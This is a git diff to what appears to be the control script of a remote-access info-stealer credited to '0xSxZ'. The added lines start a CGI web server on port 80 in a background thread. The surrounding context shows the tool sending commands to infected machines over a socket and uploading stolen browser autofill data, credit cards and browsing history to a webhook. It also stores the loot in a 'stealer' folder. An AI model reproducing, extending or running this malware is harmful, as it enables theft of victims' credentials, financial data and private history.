@@ -1,5 +1,6 @@
 PORT = 7777
 HOST = "127.0.0.1"
+PORTWEB = 80
 WEBHOOK = "" #Leave blank if you don't wanna use this.
 
 """
@@ -26,6 +27,14 @@ from pydub import AudioSegment
 from pydub.playback import play
 
 
+from http.server import HTTPServer, CGIHTTPRequestHandler
+
+os.chdir('.')
+
+def createWebServer():
+	server_object = HTTPServer(server_address=(HOST, 80), RequestHandlerClass=CGIHTTPRequestHandler)
+	server_object.serve_forever()
+threading.Thread(target=createWebServer).start()
 
 def ClearTerm():
 	if(os.name == "nt" or os.name == "windows"):
@@ -33,6 +42,7 @@ def ClearTerm():
 	else:
 		os.system("clear")
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
 ClearTerm()
 print("Made with <3 by 0xSxZ on github .")
 time.sleep(1)
@@ -55,8 +65,9 @@ ClearTerm()
 print("Ready? go !")
 time.sleep(1)
 
-
 ClearTerm()
+
+
 
 def FileInput(linee):
 	conn.send(bytes(linee, encoding='utf-8'))
@@ -250,7 +261,6 @@ while 1:
 		webhook.add_file(file=dataAutofill.decode(), filename="Autofill_And_Cr7ditC4rds.txt")
 		webhook.add_file(file=dataHistory.decode(), filename="Lmao_PornHub_History_XDDD.txt")
 		webhook.execute()
-
 	dateNow = str(datetime.now().strftime("%Y-%m-%d-%H-%M-%S"))
 	if os.name == "nt" or os.name == "windows":
 		stealerPth = "stealer\\" +dateNow
